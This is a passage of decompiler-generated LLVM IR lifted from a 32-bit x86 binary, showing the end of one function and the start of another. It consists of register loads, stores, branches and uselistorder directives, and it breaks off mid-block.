  %v1_8050813 = phi i32 [ %v1_8050553, %dec_label_pc_805053e ], [ %v1_805065a, %dec_label_pc_8050669 ], [ %v1_805065a, %dec_label_pc_8050661 ], [ %v1_8050574, %dec_label_pc_80505fd ], [ %v1_8050574, %dec_label_pc_8050583 ], [ %v1_8050574, %dec_label_pc_805055f ], [ %v1_8050809, %dec_label_pc_80507ff ]
  %v1_805080c = add i32 %v1_8050813, 51
  %v2_805080c = inttoptr i32 %v1_805080c to i8*
  %v3_805080c = load i8, i8* %v2_805080c, align 1
  %v4_805080c = icmp eq i8 %v3_805080c, 0
  %v1_8050811 = icmp eq i1 %v4_805080c, false
  br i1 %v1_8050811, label %dec_label_pc_8050857, label %dec_label_pc_8050813

dec_label_pc_8050813:                             ; preds = %dec_label_pc_805080c
  %v0_8050813 = load i32, i32* @ecx, align 4
  %v2_8050813 = add i32 %v1_8050813, -4
  %v3_8050813 = inttoptr i32 %v2_8050813 to i32*
  store i32 %v0_8050813, i32* %v3_8050813, align 4
  %v1_8050814 = add i32 %v1_8050813, -8
  %v2_8050814 = inttoptr i32 %v1_8050814 to i32*
  store i32 ptrtoint (i32* @global_var_80559f0.136 to i32), i32* %v2_8050814, align 4
  %v1_8050819 = add i32 %v1_8050813, -12
  %v2_8050819 = inttoptr i32 %v1_8050819 to i32*
  store i32 134540395, i32* %v2_8050819, align 4
  %v1_805081e = add i32 %v1_8050813, 184
  store i32 %v1_805081e, i32* @esi, align 4
  %v2_8050825 = add i32 %v1_8050813, -16
  %v3_8050825 = inttoptr i32 %v2_8050825 to i32*
  store i32 %v1_805081e, i32* %v3_8050825, align 4
  %v2_8050826 = call i32 @function_804ec6e(i32 -1, i32 %v15_8050298)
  store i32 %v2_8050826, i32* %eax.global-to-local, align 4
  %v0_805082b = load i32, i32* @esp, align 4
  %v1_805082b = inttoptr i32 %v0_805082b to i32*
  store i32 ptrtoint (i32* @global_var_80559f0.136 to i32), i32* %v1_805082b, align 4
  %v1_8050832 = call i32 @function_804ec6b(i32 -1)
  store i32 %v1_8050832, i32* %eax.global-to-local, align 4
  %v0_8050837 = load i32, i32* @esp, align 4
  %v1_8050837 = inttoptr i32 %v0_8050837 to i32*
  %v2_8050837 = load i32, i32* %v1_8050837, align 4
  store i32 %v2_8050837, i32* @eax, align 4
  %v3_8050837 = add i32 %v0_8050837, 4
  %v1_8050838 = inttoptr i32 %v3_8050837 to i32*
  %v2_8050838 = load i32, i32* %v1_8050838, align 4
  store i32 %v2_8050838, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8050838, align 4
  %v0_805083b = load i32, i32* @esi, align 4
  store i32 %v0_805083b, i32* %v1_8050837, align 4
  %v0_805083c = load i32, i32* @global_var_80586d8.197, align 8
  store i32 %v0_805083c, i32* %ebx.global-to-local, align 4
  %v2_8050842 = call i32 @function_804ec6e(i32 -1, i32 %v15_8050298)
  store i32 %v2_8050842, i32* %eax.global-to-local, align 4
  %v0_8050847 = load i32, i32* @esp, align 4
  %v1_8050847 = add i32 %v0_8050847, 16
  %v1_805084a = add i32 %v0_805083c, -1
  store i32 %v1_805084a, i32* @ebx, align 4
  %v1_805084b = add i32 %v0_8050847, 52
  %v2_805084b = inttoptr i32 %v1_805084b to i32*
  %v3_805084b = load i32, i32* %v2_805084b, align 4
  %v5_805084b = sub i32 %v3_805084b, %v1_805084a
  %v11_805084b = xor i32 %v3_805084b, %v1_805084a
  %v12_805084b = xor i32 %v5_805084b, %v3_805084b
  %v13_805084b = and i32 %v12_805084b, %v11_805084b
  %v14_805084b = icmp slt i32 %v13_805084b, 0
  %v16_805084b = icmp slt i32 %v5_805084b, 0
  %v2_805084f = icmp eq i1 %v16_805084b, %v14_805084b
  br i1 %v2_805084f, label %dec_label_pc_8050857, label %dec_label_pc_8050851

dec_label_pc_8050851:                             ; preds = %dec_label_pc_8050813
  %v4_8050851 = add i32 %v3_805084b, 1
  store i32 %v4_8050851, i32* %v2_805084b, align 4
  br label %dec_label_pc_8050878.backedge

dec_label_pc_8050857:                             ; preds = %dec_label_pc_80504e0, %dec_label_pc_8050813, %dec_label_pc_80504f7, %dec_label_pc_805080c
  %v1_8050864 = phi i32 [ %v1_8050847, %dec_label_pc_8050813 ], [ %v1_8050533, %dec_label_pc_80504f7 ], [ %v1_8050813, %dec_label_pc_805080c ], [ %v0_8050857.pre, %dec_label_pc_80504e0 ]
  %v1_8050857 = add i32 %v1_8050864, 40
  %v2_8050857 = inttoptr i32 %v1_8050857 to i32*
  %v3_8050857 = load i32, i32* %v2_8050857, align 4
  %v1_805085b = add i32 %v3_8050857, 1
  store i32 %v1_805085b, i32* %eax.global-to-local, align 4
  %v1_805085c = ashr i32 %v1_805085b, 31
  store i32 %v1_805085c, i32* %edx.global-to-local, align 4
  %v1_805085d = add i32 %v1_8050864, 248
  %v2_805085d = inttoptr i32 %v1_805085d to i32*
  %v3_805085d = load i32, i32* %v2_805085d, align 4
  %v5_805085d = zext i32 %v1_805085b to i64
  %v7_805085d = zext i32 %v1_805085c to i64
  %v8_805085d = mul nuw i64 %v7_805085d, 4294967296
  %v9_805085d = or i64 %v8_805085d, %v5_805085d
  %v10_805085d = zext i32 %v3_805085d to i64
  %v11_805085d = sdiv i64 %v9_805085d, %v10_805085d
  %v12_805085d = trunc i64 %v11_805085d to i32
  store i32 %v12_805085d, i32* %eax.global-to-local, align 4
  %v13_805085d = srem i64 %v9_805085d, %v10_805085d
  %v14_805085d = trunc i64 %v13_805085d to i32
  store i32 %v14_805085d, i32* %edx.global-to-local, align 4
  store i32 %v14_805085d, i32* %v2_8050857, align 4
  %v1_8050868 = icmp eq i32 %v14_805085d, 0
  %v1_805086a = icmp eq i1 %v1_8050868, false
  br i1 %v1_805086a, label %dec_label_pc_8050870, label %dec_label_pc_805086c

dec_label_pc_805086c:                             ; preds = %dec_label_pc_8050857
  %v0_805086c = load i32, i32* @esp, align 4
  %v1_805086c = add i32 %v0_805086c, 28
  %v2_805086c = inttoptr i32 %v1_805086c to i32*
  %v3_805086c = load i32, i32* %v2_805086c, align 4
  %v4_805086c = add i32 %v3_805086c, 1
  store i32 %v4_805086c, i32* %v2_805086c, align 4
  br label %dec_label_pc_8050870

dec_label_pc_8050870:                             ; preds = %dec_label_pc_8050857, %dec_label_pc_805086c
  %v0_8050870 = load i32, i32* @esp, align 4
  %v1_8050870 = add i32 %v0_8050870, 36
  %v2_8050870 = inttoptr i32 %v1_8050870 to i32*
  store i32 -1, i32* %v2_8050870, align 4
  br label %dec_label_pc_8050878.backedge

dec_label_pc_8050878.backedge:                    ; preds = %dec_label_pc_8050870, %dec_label_pc_80505dc, %dec_label_pc_80504ee, %dec_label_pc_8050851
  %v0_8050878.pre = load i32, i32* @esp, align 4
  %v1_8050878 = add i32 %v0_8050878.pre, 28
  %v2_8050878 = inttoptr i32 %v1_8050878 to i32*
  %v3_8050878 = load i32, i32* %v2_8050878, align 4
  %tmp119 = icmp ult i32 %v3_8050878, 3
  br i1 %tmp119, label %dec_label_pc_80502d8, label %dec_label_pc_805089d

dec_label_pc_805089d:                             ; preds = %dec_label_pc_8050252, %dec_label_pc_80502ee, %dec_label_pc_80503e2, %dec_label_pc_8050878.backedge, %dec_label_pc_80501f4, %dec_label_pc_805022c, %dec_label_pc_8050234, %dec_label_pc_8050242
  %stack_var_-192.0 = phi i16 [ -1, %dec_label_pc_8050242 ], [ -1, %dec_label_pc_8050234 ], [ -1, %dec_label_pc_805022c ], [ -1, %dec_label_pc_80501f4 ], [ %v0_805029f, %dec_label_pc_8050878.backedge ], [ %v0_805029f, %dec_label_pc_80503e2 ], [ %v0_805029f, %dec_label_pc_80502ee ], [ %v0_805029f, %dec_label_pc_8050252 ]
  %v0_805089d = call i32 @function_804f478()
  store i32 %v0_805089d, i32* %eax.global-to-local, align 4
  %v1_80508a2 = inttoptr i32 %v0_805089d to i32*
  store i32 -1, i32* %v1_80508a2, align 4
  %v0_80508a8 = load i32, i32* @esp, align 4
  %v1_80508a8 = add i32 %v0_80508a8, 44
  %v2_80508a8 = inttoptr i32 %v1_80508a8 to i32*
  %v3_80508a8 = load i32, i32* %v2_80508a8, align 4
  store i32 %v3_80508a8, i32* %eax.global-to-local, align 4
  %v2_80508ac = add i32 %v0_80508a8, 56
  %v3_80508ac = inttoptr i32 %v2_80508ac to i32*
  store i32 %v3_80508a8, i32* %v3_80508ac, align 4
  br label %dec_label_pc_80508b0

dec_label_pc_80508b0:                             ; preds = %dec_label_pc_8050615, %dec_label_pc_80505ed, %dec_label_pc_805089d
  %stack_var_-192.1 = phi i16 [ %stack_var_-192.0, %dec_label_pc_805089d ], [ %v0_805029f, %dec_label_pc_8050615 ], [ %v0_805029f, %dec_label_pc_80505ed ]
  %v0_80508b0 = load i32, i32* @esp, align 4
  %v1_80508b0 = add i32 %v0_80508b0, 20
  %v2_80508b0 = inttoptr i32 %v1_80508b0 to i32*
  %v3_80508b0 = load i32, i32* %v2_80508b0, align 4
  %v13_80508b0 = icmp eq i32 %v3_80508b0, -1
  br i1 %v13_80508b0, label %dec_label_pc_80508b0.dec_label_pc_80508c6_crit_edge, label %dec_label_pc_80508b7

dec_label_pc_80508b0.dec_label_pc_80508c6_crit_edge: ; preds = %dec_label_pc_80508b0
  %.pre = sext i16 %stack_var_-192.1 to i32
  br label %dec_label_pc_80508c6

dec_label_pc_80508b7:                             ; preds = %dec_label_pc_80508b0
  %v3_80508ba = load i32, i32* %v2_80508b0, align 4
  %v5_80508ba = add i32 %v0_80508b0, -16
  %v6_80508ba = inttoptr i32 %v5_80508ba to i32*
  store i32 %v3_80508ba, i32* %v6_80508ba, align 4
  %v1_80508be = sext i16 %stack_var_-192.1 to i32
  %v2_80508be = call i32 @function_804b2bc(i32 %v1_80508be)
  store i32 %v2_80508be, i32* %eax.global-to-local, align 4
  %v0_80508c3 = load i32, i32* @esp, align 4
  %v1_80508c3 = add i32 %v0_80508c3, 16
  br label %dec_label_pc_80508c6

dec_label_pc_80508c6:                             ; preds = %dec_label_pc_80508b0.dec_label_pc_80508c6_crit_edge, %dec_label_pc_80508b7
  %v1_80508cd.pre-phi = phi i32 [ %.pre, %dec_label_pc_80508b0.dec_label_pc_80508c6_crit_edge ], [ %v1_80508be, %dec_label_pc_80508b7 ]
  %v0_80508c6 = phi i32 [ %v0_80508b0, %dec_label_pc_80508b0.dec_label_pc_80508c6_crit_edge ], [ %v1_80508c3, %dec_label_pc_80508b7 ]
  %v1_80508c9 = add i32 %v0_80508c6, 12
  %v2_80508c9 = inttoptr i32 %v1_80508c9 to i32*
  %v3_80508c9 = load i32, i32* %v2_80508c9, align 4
  %v5_80508c9 = add i32 %v0_80508c6, -16
  %v6_80508c9 = inttoptr i32 %v5_80508c9 to i32*
  store i32 %v3_80508c9, i32* %v6_80508c9, align 4
  %v2_80508cd = call i32 @function_804e0e5(i32 %v1_80508cd.pre-phi)
  store i32 %v2_80508cd, i32* %eax.global-to-local, align 4
  %v1_80508d2 = load i32, i32* @esp, align 4
  %v2_80508d2 = inttoptr i32 %v1_80508d2 to i32*
  store i32 %v1_805020a, i32* %v2_80508d2, align 4
  %v2_80508d5 = call i32 @function_804e0e5(i32 %v1_80508cd.pre-phi)
  store i32 %v2_80508d5, i32* @eax, align 4
  %v0_80508da = load i32, i32* @esp, align 4
  %v1_80508dd = add i32 %v0_80508da, 32
  %v2_80508dd = inttoptr i32 %v1_80508dd to i32*
  store i32 -1, i32* %v2_80508dd, align 4
  %v0_80508e5 = load i32, i32* @esp, align 4
  %v1_80508e5 = add i32 %v0_80508e5, 40
  %v2_80508e5 = inttoptr i32 %v1_80508e5 to i32*
  %v3_80508e5 = load i32, i32* %v2_80508e5, align 4
  %v13_80508e5 = icmp eq i32 %v3_80508e5, -1
  br i1 %v13_80508e5, label %dec_label_pc_8050939, label %dec_label_pc_80508ec

dec_label_pc_80508ec:                             ; preds = %dec_label_pc_80508c6
  %v0_80508ec = load i32, i32* @ecx, align 4
  %v2_80508ec = add i32 %v0_80508e5, -4
  %v3_80508ec = inttoptr i32 %v2_80508ec to i32*
  store i32 %v0_80508ec, i32* %v3_80508ec, align 4
  %v1_80508ed = add i32 %v0_80508e5, -8
  %v2_80508ed = inttoptr i32 %v1_80508ed to i32*
  store i32 ptrtoint (i32* @global_var_80580c8.194 to i32), i32* %v2_80508ed, align 4
  %v1_80508f2 = add i32 %v0_80508e5, -12
  %v2_80508f2 = inttoptr i32 %v1_80508f2 to i32*
  store i32 134540395, i32* %v2_80508f2, align 4
  %v1_80508f7 = add i32 %v0_80508e5, 184
  store i32 %v1_80508f7, i32* %ebx.global-to-local, align 4
  %v2_80508fe = add i32 %v0_80508e5, -16
  %v3_80508fe = inttoptr i32 %v2_80508fe to i32*
  store i32 %v1_80508f7, i32* %v3_80508fe, align 4
  %v3_80508ff = call i32 @function_804ec6e(i32 %v1_80508cd.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_80508ff, i32* %eax.global-to-local, align 4
  %v0_8050904 = load i32, i32* @esp, align 4
  %v1_8050904 = inttoptr i32 %v0_8050904 to i32*
  store i32 ptrtoint (i32* @global_var_80580c8.194 to i32), i32* %v1_8050904, align 4
  %v2_805090b = call i32 @function_804ec6b(i32 %v1_80508cd.pre-phi)
  store i32 %v2_805090b, i32* %eax.global-to-local, align 4
  %v0_8050910 = load i32, i32* @esp, align 4
  %v1_8050910 = add i32 %v0_8050910, 56
  %v2_8050910 = inttoptr i32 %v1_8050910 to i32*
  %v3_8050910 = load i32, i32* %v2_8050910, align 4
  store i32 %v3_8050910, i32* %edx.global-to-local, align 4
  %v1_8050914 = add i32 %v0_8050910, 72
  %v2_8050914 = inttoptr i32 %v1_8050914 to i32*
  %v3_8050914 = load i32, i32* %v2_8050914, align 4
  store i32 %v3_8050914, i32* %eax.global-to-local, align 4
  %v1_8050918 = sext i32 %v3_8050910 to i64
  store i64 %v1_8050918, i64* @global_var_80580e0.195, align 32
  %v1_805091e = trunc i32 %v3_8050914 to i16
  store i16 %v1_805091e, i16* @global_var_80559ec.196, align 4
  %v1_8050924 = inttoptr i32 %v0_8050910 to i32*
  %v2_8050924 = load i32, i32* %v1_8050924, align 4
  store i32 %v2_8050924, i32* @eax, align 4
  %v3_8050924 = add i32 %v0_8050910, 4
  %v1_8050925 = inttoptr i32 %v3_8050924 to i32*
  %v2_8050925 = load i32, i32* %v1_8050925, align 4
  store i32 %v2_8050925, i32* %edx.global-to-local, align 4
  store i32 1, i32* %v1_8050925, align 4
  %v0_8050928 = load i32, i32* %ebx.global-to-local, align 4
  store i32 %v0_8050928, i32* %v1_8050924, align 4
  %v3_8050929 = call i32 @function_804ec6e(i32 %v1_80508cd.pre-phi, i32 ptrtoint (i32* @0 to i32))
  store i32 %v3_8050929, i32* %eax.global-to-local, align 4
  %v0_805092e = load i32, i32* @esp, align 4
  %v1_805092e = add i32 %v0_805092e, 32
  %v2_805092e = inttoptr i32 %v1_805092e to i32*
  store i32 -1, i32* %v2_805092e, align 4
  br label %dec_label_pc_8050936

dec_label_pc_8050936:                             ; preds = %dec_label_pc_80507aa, %dec_label_pc_80508ec
  %v0_8050936 = load i32, i32* @esp, align 4
  %v1_8050936 = add i32 %v0_8050936, 16
  br label %dec_label_pc_8050939

dec_label_pc_8050939:                             ; preds = %dec_label_pc_80508c6, %dec_label_pc_8050936
  %v0_8050939 = phi i32 [ %v0_80508e5, %dec_label_pc_80508c6 ], [ %v1_8050936, %dec_label_pc_8050936 ]
  %v1_8050939 = add i32 %v0_8050939, 16
  %v2_8050939 = inttoptr i32 %v1_8050939 to i32*
  %v3_8050939 = load i32, i32* %v2_8050939, align 4
  store i32 %v3_8050939, i32* %eax.global-to-local, align 4
  %v1_805093d = add i32 %v0_8050939, 220
  %v1_8050943 = inttoptr i32 %v1_805093d to i32*
  %v2_8050943 = load i32, i32* %v1_8050943, align 4
  store i32 %v2_8050943, i32* @ebx, align 4
  %v3_8050943 = add i32 %v0_8050939, 224
  %v1_8050944 = inttoptr i32 %v3_8050943 to i32*
  %v2_8050944 = load i32, i32* %v1_8050944, align 4
  store i32 %v2_8050944, i32* @esi, align 4
  %v3_8050944 = add i32 %v0_8050939, 228
  %v1_8050945 = inttoptr i32 %v3_8050944 to i32*
  %v2_8050945 = load i32, i32* %v1_8050945, align 4
  store i32 %v2_8050945, i32* @edi, align 4
  %v3_8050945 = add i32 %v0_8050939, 232
  %v1_8050946 = inttoptr i32 %v3_8050945 to i32*
  %v2_8050946 = load i32, i32* %v1_8050946, align 4
  store i32 %v2_8050946, i32* @ebp, align 4
  ret i32 %v3_8050939

; uselistorder directives
  uselistorder i32 %v0_8050939, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_8050910, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80508e5, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_80508c6, { 1, 0 }
  uselistorder i32 %v1_80508cd.pre-phi, { 4, 3, 2, 1, 0 }
  uselistorder i16 %stack_var_-192.1, { 1, 0 }
  uselistorder i32 %v0_8050878.pre, { 1, 0 }
  uselistorder i32 %v5_805084b, { 1, 0 }
  uselistorder i32 %v3_805084b, { 2, 0, 1, 3 }
  uselistorder i32 %v1_8050813, { 0, 5, 4, 3, 2, 1, 6 }
  uselistorder i32 %v0_80507dc, { 1, 0, 2, 3 }
  uselistorder i32 %v0_80507aa, { 1, 0 }
  uselistorder i32 %v3_8050789, { 1, 0, 2 }
  uselistorder i32 %v0_805077a, { 1, 0 }
  uselistorder i32 %v5_8050770, { 1, 0 }
  uselistorder i32* %v3_8050770, { 1, 0 }
  uselistorder i32 %v0_805064680, { 0, 1, 6, 5, 4, 3, 2 }
  uselistorder i32 %v0_8050770, { 2, 1, 0 }
  uselistorder i32 %v5_805076a, { 1, 0 }
  uselistorder i32 %v1_8050769, { 2, 1, 0, 3 }
  uselistorder i32 %v1_8050765, { 0, 2, 1, 3 }
  uselistorder i32 %v0_8050729, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9 }
  uselistorder i32 %v7_8050703, { 1, 0 }
  uselistorder i32 %v1_80506f4, { 1, 0 }
  uselistorder i32 %v0_80506b3, { 1, 3, 2, 0, 4 }
  uselistorder i32 %v1_805065a, { 1, 2, 0 }
  uselistorder i32 %v0_805065a, { 4, 1, 2, 3, 0, 5 }
  uselistorder i32 %v5_8050634, { 1, 0 }
  uselistorder i32 %v1_805062e, { 2, 1, 0, 3 }
  uselistorder i32 %v0_8050629, { 1, 2, 0 }
  uselistorder i32 %v5_805063457, { 1, 0 }
  uselistorder i32 %v5_80505d6, { 1, 0 }
  uselistorder i32 %v3_80505d6, { 2, 0, 1, 3 }
  uselistorder i32 %v3_805058e, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8050574, { 2, 3, 4, 0, 1 }
  uselistorder i32 %v0_8050574, { 0, 1, 9, 2, 3, 4, 5, 6, 7, 8, 10, 11 }
  uselistorder i32 %v0_8050553, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_8050533, { 4, 0, 1, 2, 3, 5 }
  uselistorder i32 %v0_80504d9, { 4, 0, 1, 2, 3 }
  uselistorder i32 %v0_80504be, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v1_80504a7, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_805042f, { 0, 2, 1, 3 }
  uselistorder i32 %v0_805041c, { 3, 0, 1, 2 }
  uselistorder i32 %v1_80503e2, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_80503c3, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v2_80503a7, { 1, 0 }
  uselistorder i32 %v3_805039c, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32 %v0_8050399, { 4, 0, 1, 2, 3, 5, 6 }
  uselistorder i32 %v0_805033e, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %v0_8050339, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8050322, { 1, 0 }
  uselistorder i32 %v1_80502ee, { 3, 2, 1, 0 }
  uselistorder i32 %v0_80502df91, { 2, 1, 0 }
  uselistorder i32 %v3_80502f7, { 1, 0, 2, 3, 4, 5, 6, 7, 8 }
  uselistorder i16 %v0_805029f, { 4, 5, 0, 1, 2, 3, 6 }
  uselistorder i32 %v15_8050298, { 6, 7, 4, 5, 3, 2, 0, 1, 8, 9, 10, 12, 13, 14, 15, 16, 11 }
  uselistorder i32 %v2_8050279, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v4_8050242, { 1, 0, 2 }
  uselistorder i32 %v1_805020a, { 7, 5, 11, 3, 2, 4, 10, 1, 0, 6, 9, 8, 12, 13 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 9, 10, 11, 12, 13, 14, 15, 16, 17, 4, 5, 6, 7, 8 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 44, 8, 9, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 80, 81, 82, 83, 84, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 32, 28, 29, 30, 31, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 79, 45, 46, 47, 48, 49 }
  uselistorder i32 51, { 1, 0 }
  uselistorder i32 160, { 0, 2, 1 }
  uselistorder i32 68, { 3, 0, 2, 4, 5, 1 }
  uselistorder i32 27, { 1, 2, 0 }
  uselistorder i32 112, { 0, 4, 5, 6, 2, 3, 1 }
  uselistorder i32 72, { 1, 2, 3, 0, 4 }
  uselistorder i32 (i32, i32, i32, i32)* @function_804d634, { 5, 3, 1, 2, 0, 4 }
  uselistorder i32 228, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32)* @function_804d5e4, { 1, 2, 0 }
  uselistorder i32 (i32, i32, i32)* @function_804d6e8, { 2, 6, 5, 4, 3, 1, 0 }
  uselistorder i32 17, { 9, 8, 6, 7, 3, 4, 2, 10, 5, 1, 0 }
  uselistorder i32 176, { 1, 2, 3, 0 }
  uselistorder i32 (i32)* @function_804d200, { 1, 6, 5, 4, 3, 2, 0 }
  uselistorder i32 224, { 0, 2, 1 }
  uselistorder i32 220, { 1, 2, 0 }
  uselistorder i32 260, { 2, 1, 0, 3 }
  uselistorder i32 184, { 2, 0, 1 }
  uselistorder i32 ()* @function_8050fd4, { 1, 0 }
  uselistorder i32 200, { 1, 0, 2, 3 }
  uselistorder i32 104, { 2, 0, 3, 1 }
  uselistorder i32 116, { 2, 4, 0, 1, 5, 3 }
  uselistorder i32 84, { 3, 0, 4, 1, 5, 2 }
  uselistorder i32 -12, { 11, 5, 4, 6, 3, 7, 8, 9, 10, 28, 12, 26, 25, 27, 18, 19, 13, 14, 15, 16, 17, 20, 21, 0, 22, 23, 24, 1, 2 }
  uselistorder i32 -8, { 11, 5, 4, 6, 3, 7, 8, 9, 10, 12, 29, 30, 31, 28, 18, 19, 13, 14, 15, 16, 17, 20, 21, 22, 23, 24, 25, 0, 1, 26, 2, 27 }
  uselistorder i32 (i32)* @function_804b2bc, { 6, 0, 5, 13, 12, 11, 10, 9, 8, 2, 15, 14, 7, 1, 4, 3 }
  uselistorder i32 -16, { 16, 17, 18, 7, 9, 10, 6, 8, 5, 11, 4, 12, 13, 14, 15, 19, 40, 41, 25, 26, 20, 21, 22, 23, 24, 27, 28, 1, 29, 30, 34, 31, 32, 33, 35, 2, 36, 3, 37, 38, 39, 0 }
  uselistorder i16* @global_var_80559ec.196, { 2, 1, 0 }
  uselistorder i64 4294967295, { 3, 2, 0, 1 }
  uselistorder i64* @global_var_80580e0.195, { 2, 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_80580c8.194 to i32), { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 1025, { 2, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @function_804d73a, { 6, 5, 1, 7, 4, 3, 8, 2, 0 }
  uselistorder i32 512, { 6, 3, 7, 8, 4, 5, 0, 1, 2 }
  uselistorder i8* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8050939, { 1, 0 }
  uselistorder label %dec_label_pc_8050936, { 1, 0 }
  uselistorder label %dec_label_pc_80508c6, { 1, 0 }
  uselistorder label %dec_label_pc_80508b0, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805089d, { 3, 2, 1, 0, 7, 6, 5, 4 }
  uselistorder label %dec_label_pc_8050878.backedge, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_8050870, { 1, 0 }
  uselistorder label %dec_label_pc_8050857, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_805080c, { 6, 1, 2, 3, 4, 5, 0 }
  uselistorder label %dec_label_pc_80507aa, { 1, 0 }
  uselistorder label %dec_label_pc_805077a, { 5, 2, 6, 4, 3, 0, 1 }
  uselistorder label %dec_label_pc_8050770, { 1, 0 }
  uselistorder label %dec_label_pc_8050765, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050762, { 1, 0 }
  uselistorder label %dec_label_pc_80506dd, { 1, 2, 0 }
  uselistorder label %dec_label_pc_8050625, { 1, 0 }
  uselistorder label %dec_label_pc_80504a7, { 1, 0 }
  uselistorder label %dec_label_pc_8050470, { 1, 0 }
  uselistorder label %dec_label_pc_80503e2, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80502ee, { 1, 0 }
  uselistorder label %dec_label_pc_80502d8, { 1, 0 }
}

define i32 @function_8050948() local_unnamed_addr {
dec_label_pc_8050948:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_-180 = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %v0_8050948 = load i32, i32* @ebp, align 4
  store i32 134540395, i32* %stack_var_-216, align 4
  %v3_8050957 = ptrtoint i32* %stack_var_-216 to i32
  %v2_805095c = ptrtoint i32* %stack_var_-32 to i32
  store i32 %v2_805095c, i32* @eax, align 4
  %v2_8050964 = call i32 @function_804ec6e(i32 %v2_805095c, i32 134540395)
  %v1_8050970 = call i32 @function_804ec6b(i32 ptrtoint (i32* @global_var_80559f0.136 to i32))
  store i32 %v1_8050970, i32* @eax, align 4
  %v0_8050978 = load i32, i32* @global_var_80586d4.137, align 4
  %tmp41 = icmp slt i32 %v0_8050978, 1
  %tmp42 = icmp eq i1 %tmp41, false
  br i1 %tmp42, label %dec_label_pc_8050b6f, label %dec_label_pc_8050985

dec_label_pc_8050985:                             ; preds = %dec_label_pc_8050948
  store i32 ptrtoint (i32* @global_var_80545f0.199 to i32), i32* %stack_var_-216, align 4
  %v2_8050991 = call i32 @function_804b5d0(i32 ptrtoint ([17 x i8]* @global_var_80545be.200 to i32), i32 ptrtoint (i32* @global_var_80545f0.199 to i32))
  store i32 %v2_8050991, i32* @eax, align 4
  store i32 %v2_8050991, i32* @ebp, align 4
  %v1_805099b = icmp eq i32 %v2_8050991, 0
  %v1_805099d = icmp eq i1 %v1_805099b, false
  br i1 %v1_805099d, label %dec_label_pc_8050b3a.preheader, label %dec_label_pc_80509a3

dec_label_pc_80509a3:                             ; preds = %dec_label_pc_8050985
  store i32 ptrtoint (i32* @global_var_80545f0.199 to i32), i32* %stack_var_-216, align 4
  %v2_80509af = call i32 @function_804b5d0(i32 ptrtoint ([24 x i8]* @global_var_80545cf.201 to i32), i32 ptrtoint (i32* @global_var_80545f0.199 to i32))
  store i32 %v2_80509af, i32* @ebp, align 4
  %v1_80509b9 = icmp eq i32 %v2_80509af, 0
  %v1_80509bb = icmp eq i1 %v1_80509b9, false
  br i1 %v1_80509bb, label %dec_label_pc_8050b3a.preheader, label %dec_label_pc_8050b64

dec_label_pc_8050b3a.preheader:                   ; preds = %dec_label_pc_8050985, %dec_label_pc_80509a3
  %v2_8050b41 = ptrtoint i32* %stack_var_-180 to i32
  %v3_8050a75 = add i32 %v3_8050957, 164
  %v0_8050b3a101 = load i32, i32* @edx, align 4
  store i32 128, i32* %stack_var_-216, align 4
  store i32 %v2_8050b41, i32* @ebx, align 4
  %v3_8050b46102 = call i32 @function_804c93c(i32 %v2_8050b41, i32 128, i32 %v0_8050b3a101)
  store i32 %v3_8050b46102, i32* @eax, align 4
  %v1_8050b4e103 = icmp eq i32 %v3_8050b46102, 0
  %v1_8050b50104 = icmp eq i1 %v1_8050b4e103, false
  br i1 %v1_8050b50104, label %dec_label_pc_80509c7.preheader.lr.ph, label %dec_label_pc_8050b56

dec_label_pc_80509c7.preheader.lr.ph:             ; preds = %dec_label_pc_8050b3a.preheader
  %v4_8050a5f = inttoptr i32 %tmp to i8*
  br label %dec_label_pc_80509c7.preheader

dec_label_pc_80509c6:                             ; preds = %dec_label_pc_80509d1
  %v1_80509c6 = add i32 %v0_80509c655, 1
  store i32 %v1_80509c6, i32* @ebx, align 4
  %v1_80509c7 = inttoptr i32 %v1_80509c6 to i8*
  %v2_80509c7 = load i8, i8* %v1_80509c7, align 1
  %v3_80509c7 = zext i8 %v2_80509c7 to i32
  %v5_80509c7 = and i32 %v6_80509c758, -256
  %v6_80509c7 = or i32 %v3_80509c7, %v5_80509c7
  store i32 %v6_80509c7, i32* @ecx, align 4
  %v4_80509c9 = icmp eq i8 %v2_80509c7, 0
  br i1 %v4_80509c9, label %dec_label_pc_8050b3a.backedge, label %dec_label_pc_80509d1

dec_label_pc_80509d1:                             ; preds = %dec_label_pc_80509d1.lr.ph, %dec_label_pc_80509c6
  %v6_80509c758 = phi i32 [ %v6_80509c753, %dec_label_pc_80509d1.lr.ph ], [ %v6_80509c7, %dec_label_pc_80509c6 ]
